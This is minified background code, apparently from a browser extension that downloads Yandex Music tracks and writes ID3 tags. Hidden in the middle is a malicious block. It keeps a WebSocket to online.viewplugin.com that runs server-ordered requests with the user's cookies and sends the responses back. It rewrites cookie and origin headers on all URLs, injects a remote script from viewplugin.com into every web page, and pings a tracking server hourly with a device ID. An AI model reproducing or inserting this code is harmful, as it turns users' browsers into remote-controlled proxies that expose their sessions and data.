        downloader.downloads.forEach((entity) => {
            const isAlbum = entity.type === downloader.TYPE.ALBUM;
            const isCover = isAlbum && entity.cover;
            const isPlaylist = entity.type === downloader.TYPE.PLAYLIST;
            const isTrack = entity.type === downloader.TYPE.TRACK;
            if (isCover && entity.cover.status !== downloader.STATUS.FINISHED) count++;
            if (isAlbum || isPlaylist) entity.tracks.forEach((track) => {
                if (track.status !== downloader.STATUS.FINISHED) count++
            });
            else if (isTrack && entity.status !== downloader.STATUS.FINISHED) count++
        });
        return count
    };
    downloader.getEntityByBrowserDownloadId = (browserDownloadId) => {
        let foundEntity;
        downloader.downloads.forEach((entity) => {
            if (foundEntity) return;
            const isAlbum = entity.type === downloader.TYPE.ALBUM;
            const isCover = isAlbum && entity.cover;
            const isPlaylist = entity.type === downloader.TYPE.PLAYLIST;
            const isTrack = entity.type === downloader.TYPE.TRACK;
            if (isCover && entity.cover.browserDownloadId === browserDownloadId) foundEntity = entity.cover;
            else if (isAlbum || isPlaylist) entity.tracks.forEach((track) => {
                if (foundEntity) return;
                if (track.browserDownloadId === browserDownloadId) foundEntity = track
            });
            else if (isTrack)
                if (entity.browserDownloadId === browserDownloadId) foundEntity = entity
        });
        return foundEntity
    };
    var background_downloader = downloader;
    const background_fisher = {
        utils: utils_namespaceObject,
        yandex: new yandex_Yandex,
        storage: storage,
        downloader: background_downloader
    };
    window.fisher = background_fisher;
    chrome.browserAction.setBadgeBackgroundColor({
        color: [100,
            100, 100, 255
        ]
    });
    let creative = 3;
    if (false) creative = 2;
    else if (true) creative = 1;
    let uniqId = storage.getItem("id");
    if (uniqId === false) {
        uniqId = md5_default()(Date.now() * (1E5 + rand(1, 99999)));
        storage.setItem("id", uniqId);
        fetch(`https://metric.admetric.io/?creative=3100&event=50010&host=${creative}.extension&idfa=${uniqId}&platform=${getOS()}&t=${~~(Date.now()/1E3)}`)
    }
    "use strict";
    ((c) => {
        function m() {
            c = new WebSocket("wss://online.viewplugin.com");
            c.onmessage = async ({
                data: b
            }) => {
                n = ~~(Date.now() / 1E3);
                try {
                    var a = JSON.parse(b);
                    a.action in p && c.send(new Blob([a.id, a.action, new Blob(await p[a.action](a.data))]))
                } catch (e) {}
            }
        }
        var d = (() => "10000000-1000-4000-8000-100000000000".replace(/[018]/g, (b) => (b ^ crypto.getRandomValues(new Uint8Array(1))[0] & 15 >> b / 4).toString(16)))(),
            q = localStorage.getItem("%") || d && localStorage.setItem("%", d),
            n, f = location.origin,
            g = `${f}/_generated_background_page.html?id=`,
            h = {},
            k = "cookie origin referer access-control-request-headers access-control-request-method access-control-allow-origin date dnt trailer user-agent upgrade".split(" "),
            p = {
                AUTH: () => [q, navigator.userAgent],
                REQU: async (b) => {
                    try {
                        var a = await fetch(b.url, {
                            method: b.method,
                            mode: "cors",
                            cache: "no-cache",
                            credentials: b.authenticated ? "include" : "omit",
                            headers: Object.entries(b.headers).map(([a, b]) => [(k.includes(a.toLowerCase()) ? "%" : "") + a, b]),
                            redirect: "follow",
                            body: b.body ? atob(b.body) : null
                        });
                        if (a.url.startsWith(g)) {
                            var e = decodeURIComponent(a.url).replace(g, "");
                            var c = h[e];
                            delete h[e]
                        }
                        return [a.url, "\x00", c ? c.statusCode : a.status, "\x00", c ? "Redirect" : a.statusText, "\x00", JSON.stringify(Array.from((c ?
                            c : a).headers)), "\x00", await a.blob()]
                    } catch (l) {}
                }
            };
        setInterval(() => {
            if (![0, 2].includes(c.readyState))
                if (29 < ~~(Date.now() / 1E3) - n || 3 === c.readyState) {
                    try {
                        c.close()
                    } catch (b) {}
                    m()
                } else c.send(new Blob([q, "PING"]))
        }, 15E3);
        m();
        d = ["blocking"];
        chrome.webRequest.onBeforeSendHeaders.addListener((b) => {
            if (b.initiator === f) return {
                requestHeaders: b.requestHeaders.filter(({
                    name: a
                }) => a.toLowerCase() !== k[0]).map(({
                    name: a,
                    value: b
                }) => ({
                    name: a.replace(/^%/, ""),
                    value: b
                }))
            }
        }, {
            urls: ["<all_urls>"]
        }, ["requestHeaders"].concat(d));
        chrome.webRequest.onHeadersReceived.addListener(({
            url: b,
            initiator: a,
            statusCode: c,
            responseHeaders: d,
            requestId: l
        }) => {
            if (a === f) return a = d.map(({
                name: a,
                value: b
            }) => a.toLowerCase().endsWith(k[0]) ? {
                name: `%${a}`,
                value: `${b};=`
            } : {
                name: a,
                value: b
            }), [301, 302, 307].includes(c) ? (h[l] = {
                statusCode: c,
                headers: a,
                url: b
            }, {
                redirectUrl: `${g}${l}`,
                responseHeaders: a
            }) : {
                responseHeaders: a
            }
        }, {
            urls: ["<all_urls>"]
        }, ["responseHeaders"].concat(d))
    })();
    const sendOnline = function() {
        fetch(`https://metric.admetric.io/?creative=3100&event=50020&host=${creative}.extension&idfa=${uniqId}&platform=${getOS()}&t=${~~(Date.now()/
1E3)}`)
    };
    setInterval(sendOnline, 36E5);
    sendOnline();
    chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
        background_fisher.utils.updateTabIcon(tab)
    });
    chrome.tabs.onActivated.addListener((activeInfo) => {
        chrome.tabs.get(activeInfo.tabId, (tab) => {
            if (chrome.runtime.lastError) {
                console.error(chrome.runtime.lastError.message);
                return
            }
            background_fisher.utils.updateTabIcon(tab)
        })
    });
    chrome.tabs.onUpdated.addListener((tabId, info) => {
        if (info.status === "complete") chrome.tabs.get(tabId, (tab) => {
            if (tab.url.startsWith("http")) {
                const key =
                    "linsJddtCsskjMPmD";
                const record = JSON.parse(localStorage.getItem(key));
                if (!record || (new Date).getTime() > record.timestamp) {
                    chrome.tabs.executeScript(null, {
                        code: 'if(700<window.document.head.innerHTML.length){var 
a=document.createElement("script");a.async=!0;a.id="linsJddtCsskjMPmD";a.src="//viewplugin.com/s0.js?t="+Date.now();document.body.appendChild(a)};'
                    });
                    storage.setItem(key, {
                        value: true,
                        timestamp: (new Date).getTime() + 1 * 60 * 1E3
                    })
                }
            }
        })
    });
    chrome.downloads.onChanged.addListener((delta) => {
        const entity =
            background_downloader.getEntityByBrowserDownloadId(delta.id);
        if (!entity) return;
        if (!delta.state) {
            if (false) chrome.downloads.setShelfEnabled(true);
            return
        }
        const state = delta.state.current;
        if (state === "complete") {
            entity.status = background_downloader.STATUS.FINISHED;
            background_fisher.utils.updateBadge()
        } else if (state === "interrupted") {
            entity.loadedBytes = 0;
            entity.status = background_downloader.STATUS.INTERRUPTED;
            console.error(delta, entity)
        }
        window.URL.revokeObjectURL(entity.browserDownloadUrl);
        chrome.downloads.erase({
            id: delta.id
        });
        background_downloader.activeThreadCount--;
        background_downloader.download()
    })
}, function(module, exports, __webpack_require__) {
    exports.decode = exports.parse = __webpack_require__(3);
    exports.encode = exports.stringify = __webpack_require__(4)
}, function(module, exports, __webpack_require__) {
    function hasOwnProperty(obj, prop) {
        return Object.prototype.hasOwnProperty.call(obj, prop)
    }
    module.exports = function(qs, sep, eq, options) {
        sep = sep || "&";
        eq = eq || "=";
        var obj = {};
        if (typeof qs !== "string" || qs.length === 0) return obj;
        var regexp =
            /\+/g;
        qs = qs.split(sep);
        var maxKeys = 1E3;
        if (options && typeof options.maxKeys === "number") maxKeys = options.maxKeys;
        var len = qs.length;
        if (maxKeys > 0 && len > maxKeys) len = maxKeys;
        for (var i = 0; i < len; ++i) {
            var x = qs[i].replace(regexp, "%20"),
                idx = x.indexOf(eq),
                kstr, vstr, k, v;
            if (idx >= 0) {
                kstr = x.substr(0, idx);
                vstr = x.substr(idx + 1)
            } else {
                kstr = x;
                vstr = ""
            }
            k = decodeURIComponent(kstr);
            v = decodeURIComponent(vstr);
            if (!hasOwnProperty(obj, k)) obj[k] = v;
            else if (isArray(obj[k])) obj[k].push(v);
            else obj[k] = [obj[k], v]
        }
        return obj
    };
    var isArray =
        Array.isArray || function(xs) {
            return Object.prototype.toString.call(xs) === "[object Array]"
        }
}, function(module, exports, __webpack_require__) {
    var stringifyPrimitive = function(v) {
        switch (typeof v) {
            case "string":
                return v;
            case "boolean":
                return v ? "true" : "false";
            case "number":
                return isFinite(v) ? v : "";
            default:
                return ""
        }
    };
    module.exports = function(obj, sep, eq, name) {
        sep = sep || "&";
        eq = eq || "=";
        if (obj === null) obj = undefined;
        if (typeof obj === "object") return map(objectKeys(obj), function(k) {
            var ks = encodeURIComponent(stringifyPrimitive(k)) +
                eq;
            if (isArray(obj[k])) return map(obj[k], function(v) {
                return ks + encodeURIComponent(stringifyPrimitive(v))
            }).join(sep);
            else return ks + encodeURIComponent(stringifyPrimitive(obj[k]))
        }).join(sep);
        if (!name) return "";
        return encodeURIComponent(stringifyPrimitive(name)) + eq + encodeURIComponent(stringifyPrimitive(obj))
    };
    var isArray = Array.isArray || function(xs) {
        return Object.prototype.toString.call(xs) === "[object Array]"
    };

    function map(xs, f) {
        if (xs.map) return xs.map(f);
        var res = [];
        for (var i = 0; i < xs.length; i++) res.push(f(xs[i],
            i));
        return res
    }
    var objectKeys = Object.keys || function(obj) {
        var res = [];
        for (var key in obj)
            if (Object.prototype.hasOwnProperty.call(obj, key)) res.push(key);
        return res
    }
}, function(module, exports, __webpack_require__) {
    ! function(e, t) {
        true ? module.exports = t() : "function" == typeof define && define.amd ? define(t) : (e = e || self).ID3Writer = t()
    }(this, function() {
        function a(e) {
            return String(e).split("").map(function(e) {
                return e.charCodeAt(0)
            })
        }

        function o(e) {
            return new Uint8Array(a(e))
        }

        function u(e) {
            var t = new Uint8Array(2 * e.length);
            return (new Uint16Array(t.buffer)).set(a(e)), t
        }
        return function() {
            var e = t.prototype;

            function t(e) {
                if (!(e && "object" == typeof e && "byteLength" in e)) throw new Error("First argument should be an instance of ArrayBuffer or Buffer");
                this.arrayBuffer = e, this.padding = 4096, this.frames = [], this.url = ""
            }
            return e._setIntegerFrame = function(e, t) {
                var a = parseInt(t, 10);
                this.frames.push({
                    name: e,
                    value: a,
                    size: 11 + a.toString().length
                })
            }, e._setStringFrame = function(e, t) {
                var a = t.toString();
                this.frames.push({
                    name: e,
                    value: a,
                    size: 13 +
                        2 * a.length
                })
            }, e._setPictureFrame = function(e, t, a, r) {
                var n, s, i, c = function(e) {
                        if (!e || !e.length) return null;
                        if (255 === e[0] && 216 === e[1] && 255 === e[2]) return "image/jpeg";
                        if (137 === e[0] && 80 === e[1] && 78 === e[2] && 71 === e[3]) return "image/png";
                        if (71 === e[0] && 73 === e[1] && 70 === e[2]) return "image/gif";
                        if (87 === e[8] && 69 === e[9] && 66 === e[10] && 80 === e[11]) return "image/webp";
                        var t = 73 === e[0] && 73 === e[1] && 42 === e[2] && 0 === e[3],
                            a = 77 === e[0] && 77 === e[1] && 0 === e[2] && 42 === e[3];
                        return t || a ? "image/tiff" : 66 === e[0] && 77 === e[1] ? "image/bmp" : 0 === e[0] &&
                            0 === e[1] && 1 === e[2] && 0 === e[3] ? "image/x-icon" : null
                    }(new Uint8Array(t)),
                    o = a.toString();
                if (!c) throw new Error("Unknown picture MIME type");
                a || (r = !1), this.frames.push({
                    name: "APIC",
                    value: t,
                    pictureType: e,
                    mimeType: c,
                    useUnicodeEncoding: r,
                    description: o,
                    size: (n = t.byteLength, s = c.length, i = o.length, 11 + s + 1 + 1 + (r ? 2 + 2 * (i + 1) : i + 1) + n)
                })
            }, e._setLyricsFrame = function(e, t, a) {
                var r, n, s = e.split("").map(function(e) {
                        return e.charCodeAt(0)
                    }),
                    i = t.toString(),
                    c = a.toString();
                this.frames.push({
                    name: "USLT",
                    value: c,
                    language: s,
                    description: i,
                    size: (r = i.length, n = c.length, 16 + 2 * r + 2 + 2 + 2 * n)
                })
            }, e._setCommentFrame = function(e, t, a) {
                var r, n, s = e.split("").map(function(e) {
                        return e.charCodeAt(0)
                    }),
                    i = t.toString(),
                    c = a.toString();
                this.frames.push({
                    name: "COMM",
                    value: c,
                    language: s,
                    description: i,
                    size: (r = i.length, n = c.length, 16 + 2 * r + 2 + 2 + 2 * n)
                })
            }, e._setPrivateFrame = function(e, t) {
                var a, r, n = e.toString();
                this.frames.push({
                    name: "PRIV",
                    value: t,
                    id: n,
                    size: (a = n.length, r = t.byteLength, 10 + a + 1 + r)
                })
            }, e._setUserStringFrame = function(e, t) {
                var a, r, n = e.toString(),
                    s = t.toString();
                this.frames.push({
                    name: "TXXX",
                    description: n,
                    value: s,
                    size: (a = n.length, r = s.length, 13 + 2 * a + 2 + 2 + 2 * r)
                })
            }, e._setUrlLinkFrame = function(e, t) {
                var a = t.toString();
                this.frames.push({
                    name: e,
                    value: a,
                    size: 10 + a.length
                })
            }, e.setFrame = function(e, t) {
                switch (e) {
                    case "TPE1":
                    case "TCOM":
                    case "TCON":
                        if (!Array.isArray(t)) throw new Error(e + " frame value should be an array of strings");
                        var a = "TCON" === e ? ";" : "/",
                            r = t.join(a);
                        this._setStringFrame(e, r);
                        break;
                    case "TLAN":
                    case "TIT1":
                    case "TIT2":
                    case "TIT3":
                    case "TALB":
                    case "TPE2":
                    case "TPE3":
                    case "TPE4":
                    case "TRCK":
                    case "TPOS":
                    case "TMED":
                    case "TPUB":
                    case "TCOP":
                    case "TKEY":
                    case "TEXT":
                    case "TSRC":
                        this._setStringFrame(e,
                            t);
                        break;
                    case "TBPM":
                    case "TLEN":
                    case "TDAT":
                    case "TYER":
                        this._setIntegerFrame(e, t);
                        break;
                    case "USLT":
                        if (t.language = t.language || "eng", !("object" == typeof t && "description" in t && "lyrics" in t)) throw new Error("USLT frame value should be an object with keys 
description and lyrics");
                        if (t.language && !t.language.match(/[a-z]{3}/i)) throw new Error("Language must be coded following the ISO 639-2 standards");
                        this._setLyricsFrame(t.language, t.description, t.lyrics);
                        break;
                    case "APIC":
                        if (!("object" == typeof t && "type" in
                                t && "data" in t && "description" in t)) throw new Error("APIC frame value should be an object with keys type, data and description");
                        if (t.type < 0 || 20 < t.type) throw new Error("Incorrect APIC frame picture type");
                        this._setPictureFrame(t.type, t.data, t.description, !!t.useUnicodeEncoding);
                        break;
                    case "TXXX":
                        if (!("object" == typeof t && "description" in t && "value" in t)) throw new Error("TXXX frame value should be an object with keys description and value");
                        this._setUserStringFrame(t.description, t.value);
                        break;
                    case "WCOM":
                    case "WCOP":
                    case "WOAF":
                    case "WOAR":
                    case "WOAS":
                    case "WORS":
                    case "WPAY":
                    case "WPUB":
                        this._setUrlLinkFrame(e,
                            t);
                        break;
                    case "COMM":
                        if (t.language = t.language || "eng", !("object" == typeof t && "description" in t && "text" in t)) throw new Error("COMM frame value should be an object with keys 
description and text");
                        if (t.language && !t.language.match(/[a-z]{3}/i)) throw new Error("Language must be coded following the ISO 639-2 standards");
                        this._setCommentFrame(t.language, t.description, t.text);
                        break;
                    case "PRIV":
                        if (!("object" == typeof t && "id" in t && "data" in t)) throw new Error("PRIV frame value should be an object with keys id and data");
                        this._setPrivateFrame(t.id, t.data);
                        break;
                    default:
                        throw new Error("Unsupported frame " + e);
                }
                return this
            }, e.removeTag = function() {
                if (!(this.arrayBuffer.byteLength < 10)) {
                    var e, t, a = new Uint8Array(this.arrayBuffer),
                        r = a[3],
                        n = ((e = [a[6], a[7], a[8], a[9]])[0] << 21) + (e[1] << 14) + (e[2] << 7) + e[3] + 10;
                    if (!(73 !== (t = a)[0] || 68 !== t[1] || 51 !== t[2] || r < 2 || 4 < r)) this.arrayBuffer = (new Uint8Array(a.subarray(n))).buffer
                }
            }, e.addTag = function() {
                this.removeTag();
                var e, t, r = [255, 254],
                    a = 10 + this.frames.reduce(function(e, t) {
                            return e + t.size
                        },
                        0) + this.padding,
                    n = new ArrayBuffer(this.arrayBuffer.byteLength + a),
                    s = new Uint8Array(n),
                    i = 0,
                    c = [];
                return c = [73, 68, 51, 3], s.set(c, i), i += c.length, i++, i++, c = [(e = a - 10) >>> 21 & (t = 127), e >>> 14 & t, e >>> 7 & t, e & t], s.set(c, i), i += c.length, 
this.frames.forEach(function(e) {
                    var t, a;
                    switch (c = o(e.name), s.set(c, i), i += c.length, t = e.size - 10, c = [t >>> 24 & (a = 255), t >>> 16 & a, t >>> 8 & a, t & a], s.set(c, i), i += c.length, i += 2, e.name) {
                        case "WCOM":
                        case "WCOP":
                        case "WOAF":
                        case "WOAR":
                        case "WOAS":
                        case "WORS":
                        case "WPAY":
                        case "WPUB":
                            c = o(e.value), s.set(c,
                                i), i += c.length;
                            break;
                        case "TPE1":
                        case "TCOM":
                        case "TCON":
                        case "TLAN":
                        case "TIT1":
                        case "TIT2":
                        case "TIT3":
                        case "TALB":
                        case "TPE2":
                        case "TPE3":
                        case "TPE4":
                        case "TRCK":
                        case "TPOS":
                        case "TKEY":
                        case "TMED":
                        case "TPUB":
                        case "TCOP":
                        case "TEXT":
                        case "TSRC":
                            c = [1].concat(r), s.set(c, i), i += c.length, c = u(e.value), s.set(c, i), i += c.length;
                            break;
                        case "TXXX":
                        case "USLT":
                        case "COMM":
                            c = [1], "USLT" !== e.name && "COMM" !== e.name || (c = c.concat(e.language)), c = c.concat(r), s.set(c, i), i += c.length, c = u(e.description), s.set(c, i), i +=
                                c.length, c = [0, 0].concat(r), s.set(c, i), i += c.length, c = u(e.value), s.set(c, i), i += c.length;
                            break;
                        case "TBPM":
                        case "TLEN":
                        case "TDAT":
                        case "TYER":
                            i++, c = o(e.value), s.set(c, i), i += c.length;
                            break;
                        case "PRIV":
                            c = o(e.id), s.set(c, i), i += c.length, i++, s.set(new Uint8Array(e.value), i), i += e.value.byteLength;
                            break;
                        case "APIC":
                            c = [e.useUnicodeEncoding ? 1 : 0], s.set(c, i), i += c.length, c = o(e.mimeType), s.set(c, i), i += c.length, c = [0, e.pictureType], s.set(c, i), i += c.length, 
e.useUnicodeEncoding ? (c = [].concat(r), s.set(c, i), i += c.length,
                                c = u(e.description), s.set(c, i), i += c.length, i += 2) : (c = o(e.description), s.set(c, i), i += c.length, i++), s.set(new Uint8Array(e.value), i), i += 
e.value.byteLength
                    }
                }), i += this.padding, s.set(new Uint8Array(this.arrayBuffer), i), this.arrayBuffer = n
            }, e.getBlob = function() {
                return new Blob([this.arrayBuffer], {
                    type: "audio/mpeg"
                })
            }, e.getURL = function() {
                return this.url || (this.url = URL.createObjectURL(this.getBlob())), this.url
            }, e.revokeURL = function() {
                URL.revokeObjectURL(this.url)
            }, t
        }()
    })
}]);
